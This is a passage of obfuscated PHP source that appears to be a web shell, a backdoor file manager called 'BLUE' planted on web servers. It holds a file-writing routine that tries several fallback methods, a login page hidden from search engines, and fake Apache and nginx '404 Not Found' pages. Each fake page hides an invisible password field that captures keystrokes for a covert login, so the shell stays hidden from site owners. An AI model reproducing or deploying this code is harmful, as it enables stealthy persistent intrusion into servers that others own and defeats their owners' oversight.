    return $_36db60;
}


function _fd59bbecb($_d18b65)
{
    $_8cfb6d = isset($_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)]) ? $_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] : '';
    if ($_8cfb6d === "")
        return null;
    $_3444b6 = realpath($_8cfb6d);
    $_46ce69 = realpath($_d18b65);
    if ($_3444b6 === false || $_46ce69 === false)
        return null;
    $_3444b6 = rtrim(str_replace(chr(92), chr(47), $_3444b6), "\x2f");
    $_46ce69 = str_replace(chr(92), chr(47), $_46ce69);
    if ($_46ce69 === $_3444b6) {
        $_63cd50 = "";
    } elseif (strpos($_46ce69, $_3444b6 . "\x2f") === 0) {
        $_63cd50 = substr($_46ce69, strlen($_3444b6) + 1);
    } else {
        return null;
    }
    $_172179 = (!empty($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(83)]) && $_SERVER["\x48\x54\x54\x50\x53"] !== "\x6f\x66\x66") ? chr(104).chr(116).chr(116).chr(112).chr(115) : "\x68\x74\x74\x70";
    $_f2e365 = isset($_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"]) ? $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)] : chr(108).chr(111).chr(99).chr(97).chr(108).chr(104).chr(111).chr(115).chr(116);
    $_dca3c2 = array_map(chr(114).chr(97).chr(119).chr(117).chr(114).chr(108).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101), explode(chr(47), $_63cd50));
    return $_172179 . chr(58).chr(47).chr(47) . $_f2e365 . "\x2f" . implode(chr(47), $_dca3c2);
}
function _f66d060dd()
{
    if ($_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"] === "\x50\x4f\x53\x54") {
        $_de1103 = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION["\x63\x73\x72\x66"] : "";
        $_4ec1d0 = isset($_POST["\x63\x73\x72\x66"]) ? (string)$_POST["\x63\x73\x72\x66"] : '';
        $_9ece03 = hash_equals($_de1103, $_4ec1d0);
        if (!$_9ece03) {
            http_response_code(400);
            exit("\x43\x53\x52\x46\x20\x74\x6f\x6b\x65\x6e\x20\x69\x6e\x76\x61\x6c\x69\x64");
        }
    }
}


function _f54d03cd0($_1db743, $_d25619 = null)
{
    $_479bac = "\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x42\x4c\x55\x45\x20\x40\x20" . date(chr(99)) . chr(10);
    $_d80e22 = (string)($_d25619 !== null ? $_d25619 : $_479bac);
    if ($_d80e22 === '')
        $_d80e22 = $_479bac;

    $_29a9ce = @file_put_contents($_1db743, $_d80e22, LOCK_EX);
    if ($_29a9ce !== false && $_29a9ce > 0)
        return array(true, chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115));

    $_e3c464 = @fopen($_1db743, "\x77\x62");
    if ($_e3c464) {
        $_d8d6d3 = @fwrite($_e3c464, $_d80e22);
        @fclose($_e3c464);
        if ($_d8d6d3 !== false && $_d8d6d3 > 0)
            return array(true, chr(102).chr(111).chr(112).chr(101).chr(110).chr(43).chr(102).chr(119).chr(114).chr(105).chr(116).chr(101));
    }

    $_164ce0 = @tempnam(sys_get_temp_dir(), "\x62\x6c\x75\x65\x5f");
    if ($_164ce0) {
        @file_put_contents($_164ce0, $_d80e22);
        if (@rename($_164ce0, $_1db743)) {
            if (@filesize($_1db743) > 0)
                return array(true, "\x74\x65\x6d\x70\x6e\x61\x6d\x2b\x72\x65\x6e\x61\x6d\x65");
        }
        elseif (@copy($_164ce0, $_1db743)) {
            @unlink($_164ce0);
            if (@filesize($_1db743) > 0)
                return array(true, "\x74\x65\x6d\x70\x6e\x61\x6d\x2b\x63\x6f\x70\x79");
        }
        @unlink($_164ce0);
    }

    $_7094e5 = @fopen(chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(116).chr(101).chr(109).chr(112), chr(119).chr(98).chr(43));
    if ($_7094e5) {
        @fwrite($_7094e5, $_d80e22);
        @rewind($_7094e5);
        $_64de82 = @fopen($_1db743, "\x77\x62");
        if ($_64de82) {
            $_cac730 = @stream_copy_to_stream($_7094e5, $_64de82);
            @fclose($_64de82);
            if ($_cac730 !== false && $_cac730 > 0) {
                @fclose($_7094e5);
                return array(true, "\x70\x68\x70\x3a\x2f\x2f\x74\x65\x6d\x70\x20\x63\x6f\x70\x79");
            }
        }
        @fclose($_7094e5);
    }

    if (@touch($_1db743)) {
        $_7f3a81 = @file_put_contents($_1db743, $_d80e22, FILE_APPEND);
        if ($_7f3a81 !== false && $_7f3a81 > 0)
            return array(true, "\x74\x6f\x75\x63\x68\x2b\x61\x70\x70\x65\x6e\x64");
    }

    return array(false, chr(65).chr(108).chr(108).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(115).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100));
}


function _fd9d1ecc8($_3ebd7d = "")
{
    $_fa11b8 = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : "";
?>
    <!doctype html><html lang="en" class="dark"><head>
    <meta charset="utf-8"><title>BLUE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config={theme:{extend:{fontFamily:{ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans']},colors:{canvas:{DEFAULT:'#0b1220',surface:'rgba(15,23,42,.8)'}},boxShadow:{soft:'0 10px 30px rgba(0,0,0,.45)',card:'0 6px 20px rgba(37,99,235,.22)'},borderRadius:{xl2:'18px'}}},darkMode:'class'}</script>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
    <style>
        :root{color-scheme:dark} html,body{height:100%}
        body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
        .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(59,130,246,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:flex;align-items:center;justify-content:center;}
        .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
        .btn{background:linear-gradient(180deg,#3b82f6,#2563eb);color:#eaf2ff;border-radius:12px;padding:.7rem 1rem;font-weight:700;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(37,99,235,.25);}
        .btn:hover{filter:brightness(1.05);box-shadow:0 10px 26px rgba(37,99,235,.35)} .btn:active{transform:translateY(.5px)}
        .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.6rem .8rem;width:100%;background:#0b1220;color:#e5e7eb;}
        .field:focus{outline:none;box-shadow:0 0 0 4px rgba(59,130,246,.25);border-color:#3b82f6}
        .title{background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent}
    </style>
</head><body class="shell text-slate-100">
<div class="w-full max-w-md card p-6">
    <div class="mb-5 flex items-center justify-between">
        <div class="text-xl font-bold tracking-tight title">BLUE</div>
        <span class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></span>
    </div>
    <?php if ($_3ebd7d): ?><div class="mb-3 rounded-lg border border-red-900/60 bg-red-900/30 text-red-100 px-3 py-2"><?php echo h($_3ebd7d); ?></div><?php
    endif; ?>
    <form method="post" action="?a=login" class="space-y-3">
        <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
        <div><label class="text-sm text-slate-300">Username</label><input class="field mt-1" name="user" type="text" autocomplete="username" required></div>
        <div><label class="text-sm text-slate-300">Password</label><input class="field mt-1" name="pass" type="password" autocomplete="current-password" required></div>
        <button class="btn w-full" type="submit">Login</button>
    </form>
    <p class="text-[12px] text-slate-400 mt-4 text-center">© BLUE x Secure File Manager</p>
</div>
</body></html><?php
}

function _fe9c2b7cc()
{
    $_3026d2 = isset($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)]) ? strtolower((string)$_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69)]) : "";
    if (strpos($_3026d2, chr(110).chr(103).chr(105).chr(110).chr(120)) !== false)
        return chr(110).chr(103).chr(105).chr(110).chr(120);
    if (strpos($_3026d2, "\x61\x70\x61\x63\x68\x65") !== false)
        return "\x61\x70\x61\x63\x68\x65";
    return chr(97).chr(112).chr(97).chr(99).chr(104).chr(101);
}

function _fe0fa4b42()
{
    $_fa11b8 = isset($_SESSION[chr(99).chr(115).chr(114).chr(102)]) ? $_SESSION["\x63\x73\x72\x66"] : "";
    $_f2e365 = isset($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)]) ? h($_SERVER["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"]) : chr(108).chr(111).chr(99).chr(97).chr(108).chr(104).chr(111).chr(115).chr(116);
    $_32451c  = isset($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)]) ? h($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)]) : chr(47);
    http_response_code(404);
?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_32451c; ?> was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at <?php echo $_f2e365; ?> Port 80</address>
<form method="post" action="?a=404pass" style="margin:0;padding:0;">
    <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
    <input type="password" name="pass" id="hpass"
           style="position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;border:none;outline:none;padding:0;margin:0;pointer-events:auto;"
           autocomplete="new-password" tabindex="-1" aria-hidden="true">
</form>
<script>
(function(){
    var f=document.getElementById('hpass');
    document.addEventListener('click',function(e){if(e.target!==f)f.focus();});
    f.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();this.closest('form').submit();}});
})();
</script>
</body></html><?php
}

function _f30972ee2()
{
    $_fa11b8 = isset($_SESSION["\x63\x73\x72\x66"]) ? $_SESSION[chr(99).chr(115).chr(114).chr(102)] : "";
    http_response_code(404);
?><!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
<form method="post" action="?a=404pass" style="margin:0;padding:0;">
    <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
    <input type="password" name="pass" id="hpass"
           style="position:fixed;opacity:0;width:1px;height:1px;top:0;left:0;border:none;outline:none;padding:0;margin:0;pointer-events:auto;"
           autocomplete="new-password" tabindex="-1" aria-hidden="true">
</form>
<script>
(function(){
    var f=document.getElementById('hpass');
    document.addEventListener('click',function(e){if(e.target!==f)f.focus();});
    f.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();this.closest('form').submit();}});
})();
</script>
</body>
</html><?php
}

function _f7c8a31a2()
{
    if (_fe9c2b7cc() === "\x6e\x67\x69\x6e\x78")
        _f30972ee2();
    else
        _fe0fa4b42();
}

function _f96fc16b7($_7ee8ef, $_d7937a)
{
    if (is_fn_usable(chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100).chr(95).chr(118).chr(101).chr(114).chr(105).chr(102).chr(121)))
        return password_verify($_7ee8ef, $_d7937a);
    if (strlen($_d7937a) >= 60 && ($_d7937a[0] . $_d7937a[1]) === "\x24\x32")
        return crypt($_7ee8ef, $_d7937a) === $_d7937a;
    return false;
}
function _f21b99f17($_8f784a, $_71ae88)
{
    if ($_8f784a !== AUTH_USER)
        return false;
    $_d7937a = AUTH_PASS_HASH;
    if ($_d7937a === '' || strlen($_d7937a) < 20)
        return false;
    return _f96fc16b7($_71ae88, $_d7937a);
}


function _f753d4f74($_aa96df, $_328698 = "\x69\x63\x6f")
{
    $_ad0b2e = array(
        "\x66\x6f\x6c\x64\x65\x72" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_328698 . "\x22\x20\x61\x72\x69\x61\x2d\x68\x69\x64\x64\x65\x6e\x3d\x22\x74\x72\x75\x65\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x31\x30\x20\x34\x6c\x32\x20\x32\x68\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x20\x32\x76\x31\x48\x34\x56\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x32\x2d\x32\x68\x34\x7a\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x33\x20\x39\x68\x31\x38\x76\x39\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x35\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x39\x7a\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        chr(102).chr(105).chr(108).chr(101) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_328698 . "\x22\x20\x61\x72\x69\x61\x2d\x68\x69\x64\x64\x65\x6e\x3d\x22\x74\x72\x75\x65\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x36\x20\x33\x68\x37\x6c\x35\x20\x35\x76\x31\x31\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x20\x32\x48\x36\x61\x32\x20\x32\x20\x30\x20\x30\x31\x2d\x32\x2d\x32\x56\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x6f\x70\x61\x63\x69\x74\x79\x3d\x22\x2e\x31\x32\x22\x2f\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x31\x33\x20\x33\x76\x35\x61\x32\x20\x32\x20\x30\x20\x30\x30\x32\x20\x32\x68\x35\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x6a\x6f\x69\x6e\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x63\x6f\x64\x65" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_328698 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x38\x20\x31\x36\x6c\x2d\x34\x2d\x34\x20\x34\x2d\x34\x4d\x31\x36\x20\x38\x6c\x34\x20\x34\x2d\x34\x20\x34\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\x22\x72\x6f\x75\x6e\x64\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x6a\x6f\x69\x6e\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        chr(116).chr(101).chr(120).chr(116) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_328698 . "\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x34\x20\x36\x68\x31\x36\x4d\x34\x20\x31\x32\x68\x31\x36\x4d\x34\x20\x31\x38\x68\x31\x30\x22\x20\x66\x69\x6c\x6c\x3d\x22\x6e\x6f\x6e\x65\x22\x20\x73\x74\x72\x6f\x6b\x65\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x77\x69\x64\x74\x68\x3d\x22\x32\x22\x20\x73\x74\x72\x6f\x6b\x65\x2d\x6c\x69\x6e\x65\x63\x61\x70\x3d\x22\x72\x6f\x75\x6e\x64\x22\x2f\x3e\x3c\x2f\x73\x76\x67\x3e",
        "\x70\x77\x78" => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x34\x38\x20\x34\x38\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_328698 . "\x22\x20\x61\x72\x69\x61\x2d\x68\x69\x64\x64\x65\x6e\x3d\x22\x74\x72\x75\x65\x22\x20\x78\x6d\x6c\x6e\x73\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x77\x33\x2e\x6f\x72\x67\x2f\x32\x30\x30\x30\x2f\x73\x76\x67\x22\x3e\x3c\x67\x20\x66\x69\x6c\x6c\x3d\x22\x63\x75\x72\x72\x65\x6e\x74\x43\x6f\x6c\x6f\x72\x22\x3e\x3c\x67\x20\x74\x72\x61\x6e\x73\x66\x6f\x72\x6d\x3d\x22\x74\x72\x61\x6e\x73\x6c\x61\x74\x65\x28\x2d\x37\x30\x30\x20\x2d\x35\x36\x30\x29\x22\x3e\x3c\x70\x61\x74\x68\x20\x64\x3d\x22\x4d\x37\x32\x33\x2e\x39\x39\x38\x35\x2c\x35\x36\x30\x20\x43\x37\x31\x30\x2e\x37\x34\x36\x2c\x35\x36\x30\x20\x37\x30\x30\x2c\x35\x37\x30\x2e\x37\x38\x37\x30\x39\x32\x20\x37\x30\x30\x2c\x35\x38\x34\x2e\x30\x39\x36\x36\x34\x34\x20\x43\x37\x30\x30\x2c\x35\x39\x34\x2e\x37\x34\x30\x36\x37\x31\x20\x37\x30\x36\x2e\x38\x37\x36\x2c\x36\x30\x33\x2e\x37\x37\x31\x38\x33\x20\x37\x31\x36\x2e\x34\x31\x34\x35\x2c\x36\x30\x36\x2e\x39\x35\x38\x34\x31\x32\x20\x43\x37\x31\x37\x2e\x36\x31\x34\x35\x2c\x36\x30\x37\x2e\x31\x37\x39\x37\x38\x36\x20\x37\x31\x38\x2e\x30\x35\x32\x35\x2c\x36\x30\x36\x2e\x34\x33\x35\x38\x34\x39\x20\x37\x31\x38\x2e\x30\x35\x32\x35\x2c\x36\x30\x35\x2e\x37\x39\x37\x33\x32\x38\x20\x43\x37\x31\x38\x2e\x30\x35\x32\x35\x2c\x36\x30\x35\x2e\x32\x32\x35\x30\x36\x38\x20\x37\x31\x38\x2e\x30\x33\x31\x35\x2c\x36\x30\x33\x2e\x37\x31\x30\x30\x38\x36\x20\x37\x31\x38\x2e\x30\x31\x39\x35\x2c\x36\x30\x31\x2e\x36\x39\x39\x36\x34\x38\x20\x43\x37\x31\x31\x2e\x33\x34\x33\x2c\x36\x30\x33\x2e\x31\x35\x35\x38\x39\x38\x20\x37\x30\x39\x2e\x39\x33\x34\x35\x2c\x35\x39\x38\x2e\x34\x36\x39\x33\x39\x34\x20\x37\x30\x39\x2e\x39\x33\x34\x35\x2c\x35\x39\x38\x2e\x34\x36\x39\x33\x39\x34\x20\x43\x37\x30\x38\x2e\x38\x34\x34\x2c\x35\x39\x35\x2e\x36\x38\x36\x34\x30\x35\x20\x37\x30\x37\x2e\x32\x37\x30\x35\x2c\x35\x39\x34\x2e\x39\x34\x35\x34\x38\x20\x37\x30\x37\x2e\x32\x37\x30\x35\x2c\x35\x39\x34\x2e\x39\x34\x35\x34\x38\x20\x43\x37\x30\x35\x2e\x30\x39\x31\x2c\x35\x39\x33\x2e\x34\x35\x30\x30\x37\x35\x20\x37\x30\x37\x2e\x34\x33\x35\x35\x2c\x35\x39\x33\x2e\x34\x38\x30\x31\x39\x34\x20\x37\x30\x37\x2e\x34\x33\x35\x35\x2c\x35\x39\x33\x2e\x34\x38\x30\x31\x39\x34\x20\x43\x37\x30\x39\x2e\x38\x34\x33\x2c\x35\x39\x33\x2e\x36\x35\x30\x33\x36\x36\x20\x37\x31\x31\x2e\x31\x31\x30\x35\x2c\x35\x39\x35\x2e\x39\x36\x33\x34\x39\x39\x20\x37\x31\x31\x2e\x31\x31\x30\x35\x2c\x35\x39\x35\x2e\x39\x36\x33\x34\x39\x39\x20\x43\x37\x31\x33\x2e\x32\x35\x32\x35\x2c\x35\x39\x39\x2e\x36\x34\x35\x35\x33\x38\x20\x37\x31\x36\x2e\x37\x32\x38\x2c\x35\x39\x38\x2e\x35\x38\x32\x33\x34\x20\x37\x31\x38\x2e\x30\x39\x36\x2c\x35\x39\x37\x2e\x39\x36\x34\x39\x30\x32\x20\x43\x37\x31\x38\x2e\x33\x31\x33\x35\x2c\x35\x39\x36\x2e\x34\x30\x37\x37\x35\x34\x20\x37\x31\x38\x2e\x39\x33\x34\x35\x2c\x35\x39\x35\x2e\x33\x34\x36\x30\x36\x32\x20\x37\x31\x39\x2e\x36\x32\x2c\x35\x39\x34\x2e\x37\x34\x33\x36\x38\x33\x20\x43\x37\x31\x34\x2e\x32\x39\x30\x35\x2c\x35\x39\x34\x2e\x31\x33\x35\x32\x38\x31\x20\x37\x30\x38\x2e\x36\x38\x38\x2c\x35\x39\x32\x2e\x30\x36\x39\x31\x32\x33\x20\x37\x30\x38\x2e\x36\x38\x38\x2c\x35\x38\x32\x2e\x38\x33\x36\x31\x36\x37\x20\x43\x37\x30\x38\x2e\x36\x38\x38\x2c\x35\x38\x30\x2e\x32\x30\x35\x32\x37\x39\x20\x37\x30\x39\x2e\x36\x32\x32\x35\x2c\x35\x37\x38\x2e\x30\x35\x34\x37\x38\x38\x20\x37\x31\x31\x2e\x31\x35\x38\x35\x2c\x35\x37\x36\x2e\x33\x36\x39\x36\x33\x34\x20\x43\x37\x31\x30\x2e\x39\x31\x31\x2c\x35\x37\x35\x2e\x37\x35\x39\x37\x32\x36\x20\x37\x31\x30\x2e\x30\x38\x37\x35\x2c\x35\x37\x33\x2e\x33\x31\x31\x30\x35\x38\x20\x37\x31\x31\x2e\x33\x39\x32\x35\x2c\x35\x36\x39\x2e\x39\x39\x33\x34\x35\x38\x20\x43\x37\x31\x31\x2e\x33\x39\x32\x35\x2c\x35\x36\x39\x2e\x39\x39\x33\x34\x35\x38\x20\x37\x31\x33\x2e\x34\x30\x38\x35\x2c\x35\x36\x39\x2e\x33\x34\x35\x39\x30\x32\x20\x37\x31\x37\x2e\x39\x39\x32\x35\x2c\x35\x37\x32\x2e\x34\x36\x33\x32\x31\x20\x43\x37\x31\x39\x2e\x39\x30\x38\x2c\x35\x37\x31\x2e\x39\x32\x38\x35\x39\x39\x20\x37\x32\x31\x2e\x39\x36\x2c\x35\x37\x31\x2e\x36\x36\x32\x30\x34\x37\x20\x37\x32\x34\x2e\x30\x30\x31\x35\x2c\x35\x37\x31\x2e\x36\x35\x31\x35\x30\x35\x20\x43\x37\x32\x36\x2e\x30\x34\x2c\x35\x37\x31\x2e\x36\x36\x32\x30\x34\x37\x20\x37\x32\x38\x2e\x30\x39\x33\x35\x2c\x35\x37\x31\x2e\x39\x32\x38\x35\x39\x39\x20\x37\x33\x30\x2e\x30\x31\x30\x35\x2c\x35\x37\x32\x2e\x34\x36\x33\x32\x31\x20\x43\x37\x33\x34\x2e\x35\x39\x31\x35\x2c\x35\x36\x39\x2e\x33\x34\x35\x39\x30\x32\x20\x37\x33\x36\x2e\x36\x30\x33\x2c\x35\x36\x39\x2e\x39\x39\x33\x34\x35\x38\x20\x37\x33\x36\x2e\x36\x30\x33\x2c\x35\x36\x39\x2e\x39\x39\x33\x34\x35\x38\x20\x43\x37\x33\x37\x2e\x39\x31\x32\x35\x2c\x35\x37\x33\x2e\x33\x31\x31\x30\x35\x38\x20\x37\x33\x37\x2e\x30\x38\x39\x2c\x35\x37\x35\x2e\x37\x35\x39\x37\x32\x36\x20\x37\x33\x36\x2e\x38\x34\x31\x35\x2c\x35\x37\x36\x2e\x33\x36\x39\x36\x33\x34\x20\x43\x37\x33\x38\x2e\x33\x38\x30\x35\x2c\x35\x37\x38\x2e\x30\x35\x34\x37\x38\x38\x20\x37\x33\x39\x2e\x33\x30\x39\x2c\x35\x38\x30\x2e\x32\x30\x35\x32\x37\x39\x20\x37\x33\x39\x2e\x33\x30\x39\x2c\x35\x38\x32\x2e\x38\x33\x36\x31\x36\x37\x20\x43\x37\x33\x39\x2e\x33\x30\x39\x2c\x35\x39\x32\x2e\x30\x39\x31\x37\x31\x32\x20\x37\x33\x33\x2e\x36\x39\x37\x35\x2c\x35\x39\x34\x2e\x31\x32\x39\x32\x35\x37\x20\x37\x32\x38\x2e\x33\x35\x31\x35\x2c\x35\x39\x34\x2e\x37\x32\x35\x36\x31\x32\x20\x43\x37\x32\x39\x2e\x32\x31\x32\x35\x2c\x35\x39\x35\x2e\x34\x36\x39\x35\x34\x39\x20\x37\x32\x39\x2e\x39\x38\x30\x35\x2c\x35\x39\x36\x2e\x39\x33\x39\x33\x35\x33\x20\x37\x32\x39\x2e\x39\x38\x30\x35\x2c\x35\x39\x39\x2e\x31\x38\x37\x37\x33\x20\x43\x37\x32\x39\x2e\x39\x38\x30\x35\x2c\x36\x30\x32\x2e\x34\x30\x38\x39\x34\x39\x20\x37\x32\x39\x2e\x39\x35\x30\x35\x2c\x36\x30\x35\x2e\x30\x30\x36\x37\x30\x36\x20\x37\x32\x39\x2e\x39\x35\x30\x35\x2c\x36\x30\x35\x2e\x37\x39\x37\x33\x32\x38\x20\x43\x37\x32\x39\x2e\x39\x35\x30\x35\x2c\x36\x30\x36\x2e\x34\x34\x31\x38\x37\x33\x20\x37\x33\x30\x2e\x33\x38\x32\x35\x2c\x36\x30\x37\x2e\x31\x39\x31\x38\x33\x34\x20\x37\x33\x31\x2e\x36\x30\x30\x35\x2c\x36\x30\x36\x2e\x39\x35\x35\x34\x20\x43\x37\x34\x31\x2e\x31\x33\x2c\x36\x30\x33\x2e\x37\x36\x32\x37\x39\x34\x20\x37\x34\x38\x2c\x35\x39\x34\x2e\x37\x33\x37\x36\x35\x39\x20\x37\x34\x38\x2c\x35\x38\x34\x2e\x30\x39\x36\x36\x34\x34\x20\x43\x37\x34\x38\x2c\x35\x37\x30\x2e\x37\x38\x37\x30\x39\x32\x20\x37\x33\x37\x2e\x32\x35\x34\x2c\x35\x36\x30\x20\x37\x32\x33\x2e\x39\x39\x38\x35\x2c\x35\x36\x30\x22\x2f\x3e\x3c\x2f\x67\x3e\x3c\x2f\x67\x3e\x3c\x2f\x73\x76\x67\x3e",
